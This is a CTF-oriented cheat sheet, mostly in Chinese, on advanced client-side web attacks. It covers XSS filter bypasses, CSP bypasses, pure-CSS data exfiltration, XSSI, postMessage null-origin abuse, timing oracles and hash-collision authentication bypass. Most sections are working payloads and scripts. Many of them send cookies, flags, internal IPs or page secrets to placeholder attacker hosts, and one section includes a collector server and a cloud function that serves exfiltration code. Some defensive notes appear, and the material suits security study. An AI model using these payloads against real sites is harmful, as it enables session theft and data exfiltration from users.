# CTF Web - Advanced Client-Side Attacks

Unicode 绕过、纯 CSS 外带、行为式 JS 框架、时序 oracle、HMAC 绕过、CSP 绕过与 XSSI 技巧。

## Table of Contents
- [Unicode Case Folding XSS Bypass (UNbreakable 2026)](#unicode-case-folding-xss-bypass-unbreakable-2026)
- [CSS Font Glyph Width + Container Query Exfiltration (UNbreakable 2026)](#css-font-glyph-width--container-query-exfiltration-unbreakable-2026)
- [Hyperscript CDN CSP Bypass (UNbreakable 2026)](#hyperscript-cdn-csp-bypass-unbreakable-2026)
- [PBKDF2 Prefix Timing Oracle via postMessage (UNbreakable 2026)](#pbkdf2-prefix-timing-oracle-via-postmessage-unbreakable-2026)
- [Client-Side HMAC Bypass via Leaked JS Secret (Codegate 2013)](#client-side-hmac-bypass-via-leaked-js-secret-codegate-2013)
- [Terminal Control Character Obfuscation (SECCON 2015)](#terminal-control-character-obfuscation-seccon-2015)
- [CSP Bypass via Cloud Function Whitelisted Domain (BSidesSF 2025)](#csp-bypass-via-cloud-function-whitelisted-domain-bsidessf-2025)
- [CSP Nonce Bypass via base Tag Hijacking (BSidesSF 2026)](#csp-nonce-bypass-via-base-tag-hijacking-bsidessf-2026)
- [XSSI via JSONP Callback with Cloud Function Exfiltration (BSidesSF 2026)](#xssi-via-jsonp-callback-with-cloud-function-exfiltration-bsidessf-2026)
- [CSP Bypass via link prefetch (Boston Key Party 2016)](#csp-bypass-via-link-prefetch-boston-key-party-2016)
- [Cross-Origin XSS via Shared Parent Domain Cookie Injection (0CTF 2017)](#cross-origin-xss-via-shared-parent-domain-cookie-injection-0ctf-2017)
- [Chrome Unicode URL Normalization Bypass (RCTF 2017)](#chrome-unicode-url-normalization-bypass-rctf-2017)
- [XSS Dot-Filter Bypass via Decimal IP and Bracket Notation (33C3 CTF 2016)](#xss-dot-filter-bypass-via-decimal-ip-and-bracket-notation-33c3-ctf-2016)
- [XSS via Referer Header Injection (Tokyo Westerns 2017)](#xss-via-referer-header-injection-tokyo-westerns-2017)
- [Java hashCode() Collision for Auth Bypass (CSAW 2017)](#java-hashcode-collision-for-auth-bypass-csaw-2017)
- [CSS @font-face unicode-range Data Exfiltration (Harekaze CTF 2018)](#css-font-face-unicode-range-data-exfiltration-harekaze-ctf-2018)
- [postMessage Null Origin Bypass via data URI Iframe (BackdoorCTF 2018)](#postmessage-null-origin-bypass-via-data-uri-iframe-backdoorctf-2018)
- [CSP Bypass via Attacker-Controlled Mime Type for Same-Origin Scripts (Midnight Sun CTF Finals 2018)](#csp-bypass-via-attacker-controlled-mime-type-for-same-origin-scripts-midnight-sun-ctf-finals-2018)
- [React Component State Extraction via __reactInternalInstance$ (RCTF 2018)](#react-component-state-extraction-via-__reactinternalinstance-rctf-2018)
- [CloudFlare Cache Poisoning via .js Username + Stored Self-XSS (CONFidence 2019 Teaser)](#cloudflare-cache-poisoning-via-js-username--stored-self-xss-confidence-2019-teaser)

---

## Unicode Case Folding XSS Bypass (UNbreakable 2026)

**模式（demolition）：** 服务端清洗器（Flask 正则 `<\s*/?\s*script`）只匹配 ASCII。第二层处理（Go 的 `strings.EqualFold`）会做 Unicode case folding，把 `ſ`（U+017F，拉丁长 S）规范化为 `s`。

**载荷：**
```html
<ſcript>location='https://webhook.site/ID?c='+document.cookie</ſcript>
```

**原理：**
1. Flask 正则检测 `<script`，但 `<ſcript` 不匹配（在 ASCII 语义下 `ſ ≠ s`）。
2. Go 的 `strings.EqualFold` 会把 `ſ` 规范化为 `s`，于是把 `<ſcript>` 当成 `<script>`。
3. 前端再通过 `innerHTML` 插入，浏览器便会按合法脚本标签解析。

**其他可用于绕过的 Unicode folding 对：**
- `ſ` (U+017F) -> `s` / `S`
- `ı` (U+0131) -> `i` / `I`
- `ﬁ` (U+FB01) -> `fi`
- `K` (U+212A, Kelvin sign) -> `k` / `K`

**关键点：** 不同层使用不同规范化标准（仅 ASCII 的正则 vs 感知 Unicode 的大小写折叠）时，就会产生绕过面。要分别确认每一层到底做了什么预处理。

---

## CSS Font Glyph Width + Container Query Exfiltration (UNbreakable 2026)

**模式（larpin）：** 在不执行 JavaScript 的前提下，通过 CSS 注入外带内联脚本内容（例如 `window.__USER_CONFIG__`）。核心思路是自定义字体字形宽度，再用 CSS container query 作为 oracle。

**技术细节：**
1. **选中目标**：CSS 选择器锁定内联脚本，例如 `script:not([src]):has(+script[src*='purify'])`
2. **自定义字体**：为每个字符设置唯一的 advance width：`width = (char_index + 1) * 1536`
3. **container query oracle**：外层元素设置 `container-type: inline-size`，再按不同宽度区间触发背景图请求：
```css
@container (min-width: 150px) and (max-width: 160px) {
  .probe { background: url('https://attacker.com/?char=a&pos=0'); }
}
```
4. **逐字符探测**：遍历位置，每次根据测得宽度把候选字符收缩到唯一值。

**关键点：** CSS container query 不需要 JavaScript，配合可控字形宽度后，可形成像素级精度的文本 oracle。即使在完全禁止脚本的严格 CSP 下也能工作。

---

## Hyperscript CDN CSP Bypass (UNbreakable 2026)

**模式（minegamble）：** CSP 允许 `cdnjs.cloudflare.com` 的脚本。Hyperscript（`_hyperscript`）会在 HTML 清洗完成后，再对 DOM 中的 `_=` 属性做客户端解释执行，从而把“清洗后安全”的 HTML 变成可执行逻辑。

**载荷：**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/hyperscript/0.9.12/hyperscript.min.js"></script>
<div _="on load fetch '/api/ticket' then put document.cookie into its body"></div>
```

**原理：**
1. HTML 能通过清洗器（没有内联脚本，也没有事件处理器）。
2. Hyperscript 库从 CDN 加载，符合 CSP。
3. Hyperscript 扫描 DOM，找到 `_=` 属性并把它们当作行为式指令执行。
4. `on load` 可触发任意动作，包括 `fetch`、DOM 操作、访问 cookie。

**关键点：** Hyperscript、Alpine.js（`x-data`、`x-init`）、htmx（`hx-get`、`hx-trigger`）这类声明式 JS 框架，会从 HTML 属性执行逻辑，而普通 HTML 清洗器往往不认识这些属性。只要 CSP 放行了任意 CDN 上的行为式框架，就可能同时绕过 CSP 和 HTML 清洗。

---

## PBKDF2 Prefix Timing Oracle via postMessage (UNbreakable 2026)

**模式（svfgp）：** 服务端执行 `secret.startsWith(candidate)`，后续验证又涉及非常昂贵的 PBKDF2（300 万轮）。不匹配时很快返回；匹配时才进入完整 KDF，导致可测的时序差。

**通过 postMessage 外带：**
1. 用弹窗打开目标页面。
2. 对每个字符位置枚举所有候选（`a-z0-9_}`）。
3. 通过 `postMessage` 或响应返回时间测 round-trip。
4. 延迟最高的字符就是当前位的正确前缀。

```javascript
async function probeChar(known, candidates) {
  const timings = {};
  for (const c of candidates) {
    const start = performance.now();
    // Navigate popup to verification endpoint with candidate prefix
    popup.location = `${TARGET}/verify?prefix=${known}${c}`;
    await waitForResponse();  // postMessage or load event
    timings[c] = performance.now() - start;
  }
  return Object.entries(timings).sort((a, b) => b[1] - a[1])[0][0];
}
```

**关键点：** 任何昂贵的服务端操作（PBKDF2、bcrypt、Argon2），如果外面包了一层可短路的前缀判断，就会产生时序 oracle。`startsWith` 的快速失败与完整 KDF 的慢路径差异，可通过跨域弹窗导航计时测出来。

---

## Client-Side HMAC Bypass via Leaked JS Secret (Codegate 2013)

**模式：** 应用在客户端构造带 HMAC 参数的请求 URL，而密钥硬编码在混淆后的 JavaScript 中。

**攻击步骤：**
1. 反混淆客户端 JS（`jsbeautifier.org` 或浏览器 DevTools pretty-print）。
2. 找到签名函数，提取其中的硬编码 secret。
3. 直接在浏览器控制台调用泄露的函数，伪造任意请求的合法签名。

```javascript
// Discovered in deobfuscated main.js:
function buildUrl(page) {
    var sig = calcSHA1(page + "Ace in the Hole");  // Hardcoded secret
    return "/load?p=" + page + "&s=" + sig;
}

// Exploit: call the leaked global function in browser console
var forgedUrl = "/load?p=index.php&s=" + calcSHA1("index.php" + "Ace in the Hole");
// Fetching index.php via the p parameter returns raw PHP source code
```

**关键点：** 客户端 HMAC/签名方案从定义上就会泄露密钥，因为签名所需 key 必须存在于 JavaScript 中。拆混淆、提取 secret，然后就能为任意参数伪造签名。控制台里常见可直接利用的全局函数名包括 `calcSHA1`、`hmac`、`sign`。

---

## Terminal Control Character Obfuscation (SECCON 2015)

服务端响应可能用 ASCII 退格字符（0x08）隐藏数据。终端会把 `S\x08 ` 渲染成空格（覆盖掉 `S`），导致 flag 在正常显示中“消失”。应直接处理原始字节：

```python
import socket
s = socket.socket()
s.connect((host, port))
data = s.recv(4096)
flag = data.replace(b'\x08', b'').replace(b' ', b'')
# Or: filter only printable chars that aren't followed by backspace
```

---

## CSP Bypass via Cloud Function Whitelisted Domain (BSidesSF 2025)

当 `Content-Security-Policy` 白名单中包含云平台域名（如 `*.us-central1.run.app`、`*.cloudfunctions.net`、`*.azurewebsites.net`）时：

1. 在被白名单允许的云平台上部署恶意脚本。
2. 用 `<script src="https://your-func-xxxxx.us-central1.run.app">` 加载，依然满足 CSP。
3. 再从受害页面外带数据。

```python
# Google Cloud Function that serves exfiltration JS
def serveIt(request):
    js = """
    var xhr = new XMLHttpRequest();
    xhr.open('GET', location.origin + '/admin/secret', true);
    xhr.onload = function() {
        fetch('https://attacker.com/log?flag=' + encodeURIComponent(xhr.responseText));
    };
    xhr.send(null);
    """
    return (js, 200, {'Content-Type': 'application/javascript',
                       'Access-Control-Allow-Origin': '*'})
```

用 `gcloud functions deploy serveIt --runtime python39 --trigger-http --allow-unauthenticated` 部署。

**关键点：** 云平台域名是共享基础设施。只要 CSP 把 `*.run.app` 或 `*.cloudfunctions.net` 这种整域加入白名单，攻击者自己部署的函数也能提供脚本。对云托管应用，更应优先用基于 `nonce` 或 `hash` 的 CSP，而不是域名白名单。

---

## CSP Nonce Bypass via base Tag Hijacking (BSidesSF 2026)

**模式（web-tutorial-2）：** CSP 通过 `script-src 'nonce-xxx'` 限制只能执行带 nonce 的脚本，但策略里缺少 `base-uri`。如果你能在一个相对路径脚本前注入 HTML，就能插入 `<base>`，把相对 URL 脚本重定向到你的服务器。

**脆弱 CSP：**
```text
Content-Security-Policy: script-src 'nonce-abc123'; default-src 'self'
```
注意：没有 `base-uri` 指令。

**脆弱页面 HTML：**
```html
<!-- Attacker injects here via stored XSS, parameter injection, etc. -->
<base href="https://attacker.com/">
<!-- ... later in the page ... -->
<script nonce="abc123" src="test.js"></script>
```

**原理：**
1. `<base href="https://attacker.com/">` 会修改页面上所有相对 URL 的基准地址。
2. 浏览器遇到 `<script nonce="abc123" src="test.js">` 时，会把 `test.js` 解析成 `https://attacker.com/test.js`。
3. 该脚本带合法 nonce，因此 CSP 放行。
4. 脚本从攻击者服务器加载，执行任意 JavaScript。

**利用准备：**
```python
# Host malicious test.js on attacker server
# test.js content:
"""
fetch('/api/flag')
  .then(r => r.text())
  .then(f => fetch('https://webhook.site/YOUR_ID?flag=' + encodeURIComponent(f)));
"""
```

**注入载荷：**
```html
<base href="https://attacker.com/">
```

**关键点：** `<base>` 会影响页面上的**全部**相对 URL，包括带 nonce 的脚本。`script-src 'nonce-xxx'` 只验证 nonce 是否匹配，不限制脚本加载源地址。若 CSP 中没有 `base-uri 'self'` 或 `base-uri 'none'`，只要能在相对路径的 nonced script 之前注入 HTML，就能完整绕过 CSP。

**防御：** 使用 nonce 的 CSP 时，必须同时加上 `base-uri 'self'` 或 `base-uri 'none'`，阻止 `<base>` 注入改写脚本来源。

**识别方式：** 检查 CSP 是否存在 `script-src 'nonce-...'` 且缺少 `base-uri`，再看页面上是否有在潜在注入点之后出现的相对路径 `<script src="relative.js">`。

**参考：** BSidesSF 2026 `web-tutorial-2`

---

## XSSI via JSONP Callback with Cloud Function Exfiltration (BSidesSF 2026)

**模式（three-questions-3）：** 一个多阶段攻击链：
1. **Cookie 哈希反推：** 用户 ID cookie 是 `SHA1(numeric_id)`，而 ID 只是小整数（1-100000），可暴力反推出数值 ID。
2. **debug 接口 IDOR：** `/debug/game-state?user_id=<numeric_id>` 会返回游戏状态（可由 HTML 注释和 `robots.txt` 发现）。
3. **XSSI 外带：** 管理员的游戏状态通过 Cross-Site Script Inclusion 被外带。一个类似 JSONP 的端点（`/characters.js?callback=leak`）会把响应包装成函数调用。攻击者通过管理员消息功能注入 `<script src>`，加载该端点并指定自定义回调，再把数据转发到攻击者控制的云函数。

```html
<!-- Injected via /admin-message endpoint -->
<script>
function leak(data) {
    // Exfiltrate to attacker's cloud function
    new Image().src = "https://attacker.cloudfunctions.net/exfil?d=" +
        encodeURIComponent(JSON.stringify(data));
}
</script>
<script src="/characters.js?callback=leak"></script>
```

```python
# Step 1: Brute-force SHA1 cookie to recover numeric user ID
import hashlib

cookie_hash = "a1b2c3d4..."  # From document.cookie
for i in range(1, 100001):
    if hashlib.sha1(str(i).encode()).hexdigest() == cookie_hash:
        print(f"User ID: {i}")
        break

# Step 2: Access debug endpoint
# GET /debug/game-state?user_id={recovered_id}
```

**关键点：** XSSI（Cross-Site Script Inclusion）针对的是返回 JavaScript 的端点，例如 JSONP 回调或赋值型 JS 文件。它不需要把脚本注入到目标页面，只需要跨源加载目标脚本即可。`callback` 参数是最经典的入口。再叠加管理员 bot 会访问攻击者控制页面这一前提，就能把服务端敏感数据稳稳外带出去。

**识别时机：** 应用存在 JSONP 端点，或会返回带动态数据的 JavaScript 文件；CSP 允许从同源加载脚本；URL 中出现 `?callback=` 或 `?jsonp=`。这类链条通常由“弱 cookie 哈希 -> IDOR -> XSSI -> OOB 外带”组成。

**防御：** 禁用 JSONP / callback 参数；返回 `Content-Type: application/json` 而非 `application/javascript`；加上 `X-Content-Type-Options: nosniff`；用标准 CORS 替代 JSONP。

---

## CSP Bypass via link prefetch (Boston Key Party 2016)

`<link rel="prefetch">` 不受 CSP `script-src` 限制，因此可用于无脚本数据外带：

```html
<link rel="prefetch" href="http://attacker.com/steal?data=SECRET">
<meta http-equiv="refresh" content="0; url=http://attacker.com/steal">
```

**关键点：** CSP 主要限制脚本执行，不限制导航或资源预取。当存在 XSS 但 `script-src` 挡住了内联/远程 JS 时，可改用 `<link rel="prefetch">` 或 `<meta http-equiv="refresh">` 做无脚本外带，数据通过 URL 参数或 `Referer` 头发出。

---

## Cross-Origin XSS via Shared Parent Domain Cookie Injection (0CTF 2017)

**模式（complicated xss）：** 如果攻击者可控页面与目标 XSS 页面共享同一个二级域（如 `user.example.vip` 与 `admin.example.vip`），那么设为 `domain=.example.vip` 的 cookie 会同时发往两个子域。先在攻击者可访问的子域中把恶意载荷写进 cookie，再把受害者重定向到管理端页面，若该页面会无清洗地渲染 cookie，就能打出 XSS。

```javascript
// On attacker-accessible subdomain: set cookie for shared parent domain
document.cookie = 'username=<script src=//example.invalid/payload.js></script>; path=/; domain=.example.invalid;';
// Redirect victim to admin interface on sibling subdomain
window.top.location = 'http://admin.example.invalid:8000';

// In payload.js: bypass sandbox by stealing XMLHttpRequest from iframe
var iframe = document.createElement('iframe');
iframe.src = 'about:blank';
document.body.appendChild(iframe);
window.XMLHttpRequest = iframe.contentWindow.XMLHttpRequest;
// Now use restored XMLHttpRequest to exfiltrate admin data
```

**关键点：** 设了 `domain` 的 cookie 会跨子域传播。只要任意子域可设置 cookie、目标子域又会无清洗反射 cookie 值，就能从别的子域实现 XSS。示例中的 iframe 技巧用于在沙箱环境重取一个可用的 `XMLHttpRequest`。

---

## Chrome Unicode URL Normalization Bypass (RCTF 2017)

**模式：** Chrome 在处理 URL 时，会把某些 Unicode 字符规范化为 ASCII 等价形式（IDNA/punycode 规范化）。如果应用自己对域名或 URL 组件做了长度限制或字符过滤，而没有采用同样的规范化流程，就可能被绕过。

**用于枚举 Unicode -> ASCII 映射的 fuzz：**
```python
# Fuzz Unicode chars that Chrome normalizes to specific ASCII
import unicodedata

target_char = 'a'  # Find Unicode chars that normalize to 'a'
results = []
for cp in range(0x100, 0xffff):
    c = chr(cp)
    # NFKC normalization (what browsers use for IDNA)
    normalized = unicodedata.normalize('NFKC', c)
    if normalized == target_char:
        results.append(f"U+{cp:04X} ({c}) -> {target_char}")

for r in results:
    print(r)
```

**常见有用映射：**
```text
# Characters that normalize to ASCII equivalents:
U+FF41 (ａ) -> a    # Fullwidth Latin Small Letter A
U+FF42 (ｂ) -> b    # Fullwidth Latin Small Letter B
...
U+FF5A (ｚ) -> z    # Fullwidth Latin Small Letter Z
U+2100 (℀) -> a/c   # Account Of
U+2101 (℁) -> a/s   # Addressed to the Subject
U+FF0F (／) -> /    # Fullwidth Solidus
U+FF1A (：) -> :    # Fullwidth Colon
```

**利用场景：**
```python
# Application enforces max 6-character domain
# Unicode domain uses 6 chars but normalizes to 8+ ASCII chars
unicode_domain = "\uff41\uff42\uff43\uff44\uff45\uff46"  # 6 fullwidth chars
# Chrome normalizes to: "abcdef" (6 ASCII chars)
# But some checks see: 6 Unicode code points

# Bypass character filter on domain
# Application blocks 'x' in domain names
# Use fullwidth 'ｘ' (U+FF58) instead
url = "http://e\uff58ample.com/payload"
# Chrome normalizes to http://example.com/payload
```

**关键点：** Chrome 的 IDNA/punycode 规范化会把部分 Unicode 字符映射为 ASCII。表面上 6 个 Unicode 字符的域名，浏览器实际可能解析成更长的 ASCII 域名，从而绕过应用层长度检查。全角拉丁字母（U+FF00-U+FF5E）尤其常用，因为它们几乎是 1:1 的 ASCII 映射。凡是客户端自己校验 URL 却没复用浏览器规范化逻辑的地方，都值得测。

---

## XSS Dot-Filter Bypass via Decimal IP and Bracket Notation (33C3 CTF 2016)

**模式（yoso）：** 当 XSS 过滤器会删除 URL 中的点号时（导致 `attacker.com` 和 `document.cookie` 失效），可以用三种方式绕过：  
（1）把 IP 地址改写为十进制整数形式（如 `92.123.45.67` -> 单个整数），URL 中不再出现点号。  
（2）JavaScript 属性访问改用方括号：`window["location"]`、`document["cookie"]`。  
（3）字符串拼接用 `"str"["concat"]()` 替代 `+`。

```html
<!-- Filter blocks dots, breaking: document.cookie, attacker.com -->
<!-- Bypass: decimal IP + bracket notation -->
<script>
  window["location"] = "http://1558071511/"["concat"](document["cookie"])
</script>

<!-- Decimal IP conversion: -->
<!-- 92*256^3 + 123*256^2 + 45*256 + 67 = 1558071511 -->
<!-- http://1558071511/ resolves to 92.123.45.67 -->
```

**关键点：** 十进制 IP 在 URL 中是合法表示，且没有点号。再结合 JavaScript 的方括号属性访问，就能绕过一切只盯着 `.` 字符的过滤器。

---

## XSS via Referer Header Injection (Tokyo Westerns 2017)

**模式：** HTTP `Referer` 头被无清洗地反射进 `<meta http-equiv="refresh">` 或其他 HTML 上下文，导致 XSS。再叠加 WebRTC ICE candidate 泄露内网 IP，可用于进一步 SSRF 到仅本地可访问的服务。

```html
<!-- Vulnerable page template — Referer header reflected verbatim: -->
<meta http-equiv="refresh" content="0; url=REFERER_VALUE">

<!-- Inject XSS by sending a crafted Referer: -->
<!-- Referer: javascript:alert(document.cookie) -->
<!-- Produces: <meta http-equiv="refresh" content="0; url=javascript:alert(document.cookie)"> -->
```

```python
import requests

TARGET = "http://target/page"

# Step 1: XSS via Referer in meta refresh context
xss_payload = "javascript:fetch('https://attacker.com/?c='+document.cookie)"
r = requests.get(TARGET, headers={"Referer": xss_payload})
# If target reflects Referer into meta refresh, victim browser executes the JS
```

**与 WebRTC 内网 IP 泄露组合：**
```javascript
// WebRTC ICE candidates leak internal IPs without user interaction
// Inject this payload to discover internal network topology
var pc = new RTCPeerConnection({
    iceServers: [{urls: "stun:stun.l.google.com:19302"}]
});
pc.createDataChannel("");
pc.createOffer().then(o => pc.setLocalDescription(o));
pc.onicecandidate = function(ice) {
    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
    // Candidate string contains internal IP: "192.168.x.x" or "10.x.x.x"
    fetch('https://attacker.com/?ip=' + encodeURIComponent(ice.candidate.candidate));
};
```

```bash
# Full attack chain:
# 1. Find page that reflects Referer without sanitization
curl -v -H "Referer: test_marker" http://target/page 2>&1 | grep "test_marker"

# 2. Inject XSS payload that runs WebRTC to leak internal IP
# 3. Use leaked internal IP for SSRF to localhost:80 or internal services
# e.g., http://192.168.1.1/admin — accessible only from internal network
```

**关键点：** `Referer` 很少被当成“用户输入”去清洗，因此一旦它被放进 `<meta refresh>`、`<script>` 或 URL 属性，就很容易形成 XSS。WebRTC 的 `RTCPeerConnection` 则能在无交互、无额外权限下泄露 ICE candidate 中的内网 IP，适合在拿到初始 XSS 后继续做内网探测。

---

## Java hashCode() Collision for Auth Bypass (CSAW 2017)

**模式：** Java 的 `String.hashCode()` 使用 31 为底的多项式 rolling hash，并在 32 位整型上溢出。其键空间小、结构简单，碰撞非常容易找到。如果应用把 `hashCode()` 用于密码比较或 token 校验，就能构造碰撞字符串绕过认证。

```java
// Java hashCode formula:
// h = 0
// for each char c: h = 31 * h + c  (with 32-bit overflow)

// Vulnerable authentication:
if (password.hashCode() == storedHash) {
    grantAccess();   // WRONG: hashCode collisions trivially found
}
```

```python
def java_hashcode(s):
    """Replicate Java's String.hashCode() in Python."""
    h = 0
    for c in s:
        h = (31 * h + ord(c)) & 0xFFFFFFFF
    # Handle Java's signed 32-bit integer behavior
    if h >= 0x80000000:
        h -= 0x100000000
    return h

# Verify: known collision pair
target = "Pas$ion"
assert java_hashcode("ParDJon") == java_hashcode(target)
print(f"hashCode('ParDJon') = {java_hashcode('ParDJon')}")
print(f"hashCode('Pas$ion') = {java_hashcode(target)}")
# Both return the same value

# Find collisions for an arbitrary target string:
target_hash = java_hashcode("secretPassword")

# Brute-force short strings:
import itertools, string
charset = string.printable.strip()
for length in range(4, 9):
    for candidate in itertools.product(charset, repeat=length):
        s = ''.join(candidate)
        if java_hashcode(s) == target_hash:
            print(f"Collision found: '{s}'")
            break
```

**已知碰撞对：**
```text
"Aa"   == "BB"        (hashCode = 2112)
"AaBB" == "BBAa"      (longer collision)
"ParDJon" == "Pas$ion"
```

**系统化生成碰撞：**
```python
# For any two characters a, b where ord(a)*31 + ord(b) == ord(c)*31 + ord(d):
# The strings ending in "ab" and "cd" will have the same hash contribution
# Exploit: find char pairs with equal (31*h + ord(c)) mod 2^32

# Quick collision finder for 2-char suffix:
def find_collision(target_str):
    target_h = java_hashcode(target_str)
    for c1 in range(32, 127):
        for c2 in range(32, 127):
            candidate = target_str[:-1] + chr(c1) + chr(c2)
            # ... adjust prefix to match hash
    pass
```

**关键点：** Java `hashCode()` 因为结构过于简单且只在 32 位空间上运算，碰撞极易构造。它只能用于哈希表分桶，绝不能用于密码、token、签名等安全比较。若源码里出现 `password.hashCode() == storedHash`、`token.hashCode()` 这类逻辑，应直接视为认证缺陷。

**识别方式：** Java 源码中把 `.hashCode()` 用于密码比较、token 验证，或任何本该使用 `equals()` + 安全哈希（bcrypt、PBKDF2 等）的安全判断。

---

## CSS @font-face unicode-range Data Exfiltration (Harekaze CTF 2018)

**模式：** 为每个字符单独定义一个 `@font-face`，并用 `unicode-range` 只匹配一个 code point。无头浏览器或管理员 bot 在渲染目标元素时，只有目标文本中**实际出现**的字符，才会触发对应字体 URL 的请求。攻击者服务器据此判断哪些字符存在于目标文本中。

```css
/* Each @font-face triggers a fetch only if that character exists in .target */
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=a'); unicode-range: U+0061; }
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=b'); unicode-range: U+0062; }
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=c'); unicode-range: U+0063; }
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=0'); unicode-range: U+0030; }
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=1'); unicode-range: U+0031; }
/* ... one per character in the target alphabet ... */
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=_'); unicode-range: U+005F; }
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=%7B'); unicode-range: U+007B; } /* { */
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=%7D'); unicode-range: U+007D; } /* } */

/* Apply the font to the element containing the secret */
.target { font-family: exfil; }
```

```python
# Generate the full @font-face CSS payload
import string

charset = string.ascii_lowercase + string.digits + "_{}"
css_rules = []
for c in charset:
    code_point = f"U+{ord(c):04X}"
    encoded_c = c if c.isalnum() else f"%{ord(c):02X}"
    css_rules.append(
        f"@font-face {{ font-family: exfil; "
        f"src: url('http://attacker.com/leak?c={encoded_c}'); "
        f"unicode-range: {code_point}; }}"
    )
css_rules.append(".target { font-family: exfil; }")
payload = "\n".join(css_rules)

# Host as CSS file — MUST serve with Content-Type: text/css for cross-origin
# Inject via: <link rel="stylesheet" href="http://attacker.com/exfil.css">
# Or via CSS injection: <style>@import url('http://attacker.com/exfil.css');</style>
```

```python
# Server-side: collect leaked characters
from flask import Flask, request

app = Flask(__name__)
leaked_chars = set()

@app.route('/leak')
def leak():
    c = request.args.get('c', '')
    leaked_chars.add(c)
    print(f"Leaked chars so far: {''.join(sorted(leaked_chars))}")
    # Return a minimal valid font file (or 404 — the request itself is the leak)
    return '', 204

app.run(host='0.0.0.0', port=80)
```

**限制与补救：**
```text
# unicode-range leaks character SET, not order or count
# Leaked: {a, c, f, g, l, _} from "flag_cfg" — no positional info

# To recover ordering, combine with CSS positional tricks:
# 1. Use ::first-letter with a unique font to leak position 1
# 2. Use text-indent + overflow: hidden tricks to isolate characters
# 3. Chain with :nth-child selectors if target chars are in separate elements
```

**关键点：** `unicode-range` 只会在目标元素确实包含某字符时触发对应字体请求。在严格 CSP 禁止脚本、但允许 `style-src` 的场景下，这是一种稳定的纯 CSS 外带手法。它默认只能泄露字符集合，拿不到顺序和数量；若顺序重要，需要继续叠加定位类 CSS 技巧。另见 [CSS Font Glyph Width + Container Query Exfiltration](#css-font-glyph-width--container-query-exfiltration-unbreakable-2026)，那是更精确的纯 CSS oracle。

---

### postMessage Null Origin Bypass via data URI Iframe (BackdoorCTF 2018)

**模式：** 某些 Web 应用会校验 `postMessage` 的来源，而 `data:` URI iframe 的来源是 `null`，可借此绕过同源检查。常见的错误写法只判断 `event.origin !== expected`，却没有显式处理 `null`，于是来自沙箱上下文的消息也会被接受。

**脆弱处理器：**
```javascript
// Target application's message handler:
window.addEventListener('message', function(event) {
    // Weak origin check — doesn't handle null origin
    if (event.origin === 'http://trusted.com' || !event.origin) {
        // Process message — renders user-controlled HTML/JS
        document.getElementById('content').innerHTML = event.data.details.sender_username;
    }
});
```

**通过 data: URI iframe 利用：**
```html
<iframe src="data:text/html,<script>
var w = window.open('http://target/page');
setTimeout(function(){
    w.postMessage({type:'audio', details:{
        sender_username:'<img src=x onerror=fetch(`http://attacker/`+document.cookie)>'}
    }, '*');
}, 1000);
</script>"></iframe>
```

**替代方案：sandbox iframe：**
```html
<!-- sandbox attribute without allow-same-origin also produces null origin -->
<iframe sandbox="allow-scripts" srcdoc="
<script>
    parent.postMessage({type:'audio', details:{
        sender_username:'<img src=x onerror=fetch(`http://attacker/`+document.cookie)>'}
    }, '*');
</script>
"></iframe>
```

```python
# Host the exploit page on attacker server
exploit_html = '''
<html><body>
<iframe src="data:text/html,
<script>
var w = window.open('http://target/messages');
setTimeout(function(){
    w.postMessage({
        type: 'audio',
        details: {
            sender_username: '<img src=x onerror=fetch(`http://attacker.com/steal?c=`+document.cookie)>'
        }
    }, '*');
}, 1500);
</script>
"></iframe>
</body></html>
'''
# Serve this page, then send the URL to the admin bot
```

**关键点：** `data:` URI iframe 的来源是 `null`；不带 `allow-same-origin` 的 `sandbox` iframe 也是 `null`。很多 `postMessage` 处理器只验证“是否等于受信域名”，却忘了拒绝 `null` 或空 origin。测试这类逻辑时，应优先尝试 `data:` URI 和 sandboxed iframe。修复方式是显式拒绝：`if (!event.origin || event.origin === 'null') return;`。

---

## CSP Bypass via Attacker-Controlled Mime Type for Same-Origin Scripts (Midnight Sun CTF Finals 2018)

**模式（Mimisbrunnr）：** 端点 `/xss?xss=<payload>&mimis=<mime>` 会回显 `payload`，且 `Content-Type` 由攻击者指定。站点 CSP 为 `script-src 'self'`，并设置了 `X-Content-Type-Options: nosniff`，因此普通 XSS 看似被挡住。但只要把 `mimis` 设成 `application/javascript`（或 Chrome 接受的 `jscript`），同源响应就能通过 `<script src="/xss?...&mimis=jscript">` 作为脚本加载。

**利用：**
```html
<!-- Served by attacker's XSS injection point (another endpoint on the same origin) -->
<script src="/xss?xss=function%20WELCOME(){};var%20oooooo=0;/*&mimis=jscript"></script>
<script src="/xss?xss=*/payload;//&mimis=jscript"></script>
```
- 第一条请求夹带无害 token，并顺手打开块注释 `/*`。
- 第二条请求关闭注释 `*/`，再执行真正载荷。
- 两个响应都来自同源，所以满足 `script-src 'self'`；而浏览器不会再因为 MIME 不符拒绝它们，因为服务器明确宣称了可执行脚本类型。

**关键点：** `X-Content-Type-Options: nosniff` 只会阻止浏览器自行猜测 MIME，不会推翻服务器**自己声明**的 `Content-Type`。只要有任意端点允许攻击者影响响应类型，即便只是通过查询参数或 `Accept` 头间接控制，它就可能在 `script-src 'self'` 下成为脚本 gadget。修复方式是对回显型端点硬编码 `Content-Type`，绝不要让用户输入进入响应头。

**参考：** Midnight Sun CTF Finals 2018 — writeup 10258

---

## React Component State Extraction via __reactInternalInstance$ (RCTF 2018)

**模式：** 在 React 页面上拿到 XSS 后，不一定能直接读到服务端状态，但 React 管理的每个 DOM 节点通常都挂有 `__reactInternalInstance$<random>` 属性，能回溯到 React Fiber 节点。继续取 `.return.stateNode.state`（新版本常是 `.memoizedState`），就能读到从未序列化进 HTML 的组件状态。

**外带载荷：**
```javascript
const key = Object.keys(document.querySelector('[data-react-root]'))
  .find(k => k.startsWith('__reactInternalInstance$'));
const fiber = document.querySelector('[data-react-root]')[key];
const state = fiber.return.stateNode.state;
fetch('https://attacker.example/log?s=' + encodeURIComponent(JSON.stringify(state)));
```

